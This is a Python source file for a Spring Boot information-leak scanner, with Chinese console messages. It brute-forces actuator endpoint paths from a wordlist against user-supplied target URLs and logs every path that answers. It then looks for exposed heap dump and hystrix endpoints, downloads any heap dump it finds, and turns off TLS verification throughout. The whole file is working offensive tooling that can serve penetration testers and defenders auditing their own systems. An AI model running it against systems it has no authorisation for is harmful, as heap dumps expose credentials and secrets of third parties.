#!/usr/bin/env python
# coding=utf-8

from inc import output,console
import requests, sys
from tqdm import tqdm
from termcolor import cprint
import requests.packages.urllib3


def url(urllist):
    requests.packages.urllib3.disable_warnings()
    f1 = open("urlout.txt", "wb+")
    f1.close()
    cprint(f"================开始对目标URL测试SpringBoot信息泄露端点================", "cyan")
    with open("Dir.txt", 'r') as web:
        webs = web.readlines()
        for web in webs:
            web = web.strip()
            if ('://' not in urllist):
                urllist = str("http://") + str(urllist)
            if str(urllist[-1]) != "/":
                u = urllist + "/" + web
            else:
                u = urllist + web
            r = requests.get(u,verify=False)
            if r.status_code == 200:
                cprint("[+]状态码%d" % r.status_code + ' ' + "信息泄露URL为:" + u + '    ' + "页面长度为:" + str(len(r.content)),"red")
                f2 = open("urlout.txt", "a")
                f2.write(u + '\n')
                f2.close()
            else:
                cprint("[-]状态码%d" % r.status_code + ' ' + "无法访问URL为:" + u ,"yellow")
    count = len(open("urlout.txt", 'rU').readlines())
    if count >= 1:
        print('\n')
        cprint("[+][+][+]发现目标URL存在SpringBoot敏感信息泄露，已经导出至 urlout.txt ，共%d行记录" % count,"magenta")
    sys.exit()

def file(filename):
    f1 = open("output.txt", "wb+")
    f1.close()
    cprint("================开始读取目标TXT并测试SpringBoot信息泄露端点================","cyan")
    with open(filename, 'r') as temp:
        for url in temp.readlines():
            url = url.strip()
            with open("Dir.txt", 'r') as web:
                webs = web.readlines()
                for web in webs:
                    web = web.strip()
                    if ('://' not in url):
                        url = str("http://") + str(url)
                    if str(url[-1]) != "/":
                        u = url + "/" + web
                    else:
                        u = url + web
                    requests.packages.urllib3.disable_warnings()
                    r = requests.get(u,verify=False)
                    if r.status_code == 200:
                        cprint("[+]状态码%d" % r.status_code + ' ' + "信息泄露URL为:" + u + '    ' + "页面长度为:" + str(len(r.content)),"red")
                        f2 = open("output.txt", "a")
                        f2.write(u + '\n')
                        f2.close()
                    else:
                        cprint("[-]状态码%d" % r.status_code + ' ' + "无法访问URL为:" + u ,"yellow")
    count = len(open("output.txt", 'rU').readlines())
    if count >= 1:
        print('\n')
        cprint("[+][+][+]发现目标TXT内存在SpringBoot敏感信息泄露，已经导出至 output.txt ，共%d行记录"%count,"magenta")
    sys.exit()

def dump(urllist):
    if ('://' not in urllist):
        urllist = str("http://") + str(urllist)
    if str(urllist[-1]) != "/":
        urllist = urllist + "/"
    def download(url: str, fname: str):
        # 用流stream的方式获取url的数据
        requests.packages.urllib3.disable_warnings()
        resp = requests.get(url, stream=True ,verify=False)
        # 拿到文件的长度，并把total初始化为0
        total = int(resp.headers.get('content-length', 0))
        # 打开当前目录的fname文件(名字你来传入)
        # 初始化tqdm，传入总数，文件名等数据，接着就是写入，更新等操作了
        with open(fname, 'wb') as file, tqdm(
                desc=fname,
                total=total,
                unit='iB',
                unit_scale=True,
                unit_divisor=1024,
        ) as bar:
            for data in resp.iter_content(chunk_size=1024):
                size = file.write(data)
                bar.update(size)
    cprint("================开始对目标URL测试SpringBoot敏感文件泄露并下载================","cyan")
    # 下载文件，并传入文件名
    url1 = urllist + "actuator/heapdump"
    url2 = urllist + "heapdump"
    url3 = urllist + "heapdump.json"
    url4 = urllist + "gateway/actuator/heapdump"
    url5 = urllist + "hystrix.stream"

    if str(requests.head(url1)) != "<Response [200]>":
        cprint("[-]在 /actuator/heapdump 未发现heapdump敏感文件泄露" ,"yellow")
    else:
        url = url1
        cprint("[+][+][+]发现 /actuator/heapdump 敏感文件泄露" + ' ' + "下载端点URL为:" + url ,"magenta")
        download(url, "heapdump")
        sys.exit()
    if str(requests.head(url2)) != "<Response [200]>":
        cprint("[-]在 /heapdump 未发现heapdump敏感文件泄露" ,"yellow")
    else:
        url = url2
        cprint("[+][+][+]发现 /heapdump 敏感文件泄露" + ' ' + "下载端点URL为:" + url ,"magenta")
        download(url, "heapdump")
        sys.exit()
    if str(requests.head(url3)) != "<Response [200]>":
        cprint("[-]在 /heapdump.json 未发现heapdump敏感文件泄露" ,"yellow")
    else:
        url = url3
        cprint("[+][+][+]发现 /heapdump.json 敏感文件泄露" + ' ' + "下载端点URL为:" + url ,"magenta")
        download(url, "heapdump.json")
        sys.exit()
    if str(requests.head(url4)) != "<Response [200]>":
        cprint("[-]在 /gateway/actuator/heapdump 未发现heapdump敏感文件泄露" ,"yellow")
    else:
        url = url4
        cprint("[+][+][+]发现 /gateway/actuator/heapdump 敏感文件泄露" + ' ' + "下载端点URL为:" + url ,"magenta")
        download(url, "heapdump")
        sys.exit()
    if str(requests.head(url5)) != ("<Response [401]>" or "<Response [200]>"):
        cprint("[-]在 /hystrix.stream 未发现hystrix监控数据文件泄露，请手动验证","yellow")
    else:
        url = url5
        cprint("[+][+][+]发现 /hystrix.stream 监控数据文件泄露" + ' ' + "下载端点URL为:" + url ,"magenta")
        download(url, "hystrix.stream")
        sys.exit()
    sys.exit()

